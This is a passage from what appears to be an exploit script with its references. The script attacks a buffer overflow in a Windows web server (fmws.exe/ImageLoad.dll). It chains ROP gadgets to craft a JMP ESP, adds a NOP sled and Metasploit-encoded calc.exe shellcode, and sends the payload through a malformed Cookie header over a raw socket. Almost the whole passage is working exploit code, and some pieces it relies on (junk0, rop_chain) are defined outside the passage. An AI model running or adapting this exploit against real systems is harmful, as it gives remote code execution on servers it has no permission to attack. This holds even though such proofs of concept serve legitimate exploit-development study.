# The memory located at 0x1001D8F0: "\x7A\xD8\x01\x10" does the job!
# Due to call dword ptr [edx+28h]: 0x1001D8F0 - 28h = 0x1001D8C8
old_call_edx=pack('<L',0x1001D8C8) 


junk1="\x90" * 280
ppr=pack('<L',0x10010101) # POP EBX # POP ECX # RETN [ImageLoad.dll]

# Since 0x00 would break the exploit, the 0x00457452 (JMP ESP [fmws.exe]) needs to be crafted on the stack
crafted_jmp_esp=pack('<L',0xA445ABCF)

test_bl=pack('<L',0x10010125) # contains 00000000 to pass the JNZ instruction

kungfu=pack('<L',0x10022aac)  # MOV EAX,EBX # POP ESI # POP EBX # RETN [ImageLoad.dll]
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0xDEADBEEF) # filler
kungfu+=pack('<L',0x1001a187) # ADD EAX,5BFFC883 # RETN [ImageLoad.dll] # finish crafting JMP ESP
kungfu+=pack('<L',0x1002466d) # PUSH EAX # RETN [ImageLoad.dll]

nopsled="\x90" * 70

# windows/exec CMD=calc.exe 
# Encoder: x86/shikata_ga_nai
# powered by Metasploit 
# msfpayload windows/exec CMD=calc.exe R | msfencode -b '\x00\x0a\x0d'

shellcode=("\xda\xca\xbb\xfd\x11\xa3\xae\xd9\x74\x24\xf4\x5a\x31\xc9" +
"\xb1\x33\x31\x5a\x17\x83\xc2\x04\x03\xa7\x02\x41\x5b\xab" +
"\xcd\x0c\xa4\x53\x0e\x6f\x2c\xb6\x3f\xbd\x4a\xb3\x12\x71" +
"\x18\x91\x9e\xfa\x4c\x01\x14\x8e\x58\x26\x9d\x25\xbf\x09" +
"\x1e\x88\x7f\xc5\xdc\x8a\x03\x17\x31\x6d\x3d\xd8\x44\x6c" +
"\x7a\x04\xa6\x3c\xd3\x43\x15\xd1\x50\x11\xa6\xd0\xb6\x1e" +
"\x96\xaa\xb3\xe0\x63\x01\xbd\x30\xdb\x1e\xf5\xa8\x57\x78" +
"\x26\xc9\xb4\x9a\x1a\x80\xb1\x69\xe8\x13\x10\xa0\x11\x22" +
"\x5c\x6f\x2c\x8b\x51\x71\x68\x2b\x8a\x04\x82\x48\x37\x1f" +
"\x51\x33\xe3\xaa\x44\x93\x60\x0c\xad\x22\xa4\xcb\x26\x28" +
"\x01\x9f\x61\x2c\x94\x4c\x1a\x48\x1d\x73\xcd\xd9\x65\x50" +
"\xc9\x82\x3e\xf9\x48\x6e\x90\x06\x8a\xd6\x4d\xa3\xc0\xf4" +
"\x9a\xd5\x8a\x92\x5d\x57\xb1\xdb\x5e\x67\xba\x4b\x37\x56" +
"\x31\x04\x40\x67\x90\x61\xbe\x2d\xb9\xc3\x57\xe8\x2b\x56" +
"\x3a\x0b\x86\x94\x43\x88\x23\x64\xb0\x90\x41\x61\xfc\x16" +
"\xb9\x1b\x6d\xf3\xbd\x88\x8e\xd6\xdd\x4f\x1d\xba\x0f\xea" +
"\xa5\x59\x50")

payload=junk0 + old_call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + kungfu + nopsled + shellcode

payload2 = junk0 + old_call_edx + junk1 + ppr + crafted_jmp_esp + test_bl + rop_chain + nopsled + shellcode

buf="GET /vfolder.ghp HTTP/1.1\r\n"
buf+="User-Agent: Mozilla/4.0\r\n"
buf+="Host:" + host + ":" + str(port) + "\r\n"
buf+="Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
buf+="Accept-Language: en-us\r\n"
buf+="Accept-Encoding: gzip, deflate\r\n"
buf+="Referer: http://" + host + "/\r\n"
buf+="Cookie: SESSIONID=1337; UserID=" + payload2 + "; PassWD=;\r\n"
buf+="Conection: Keep-Alive\r\n\r\n"

print "[*] Connecting to Host " + host + "..."

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
try:
    connect=s.connect((host, port))
    print "[*] Connected to " + host + "!"
except:
    print "[!] " + host + " didn't respond\n"
    sys.exit(0)
    
print "[*] Sending malformed request..."
s.send(buf)

print "[!] Exploit has been sent!\n"
s.close()
```

# References

### c1
https://www.exploit-db.com/exploits/30032

### c2
https://www.exploit-db.com/exploits/24944

### c3
https://docs.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-setprocessdeppolicy

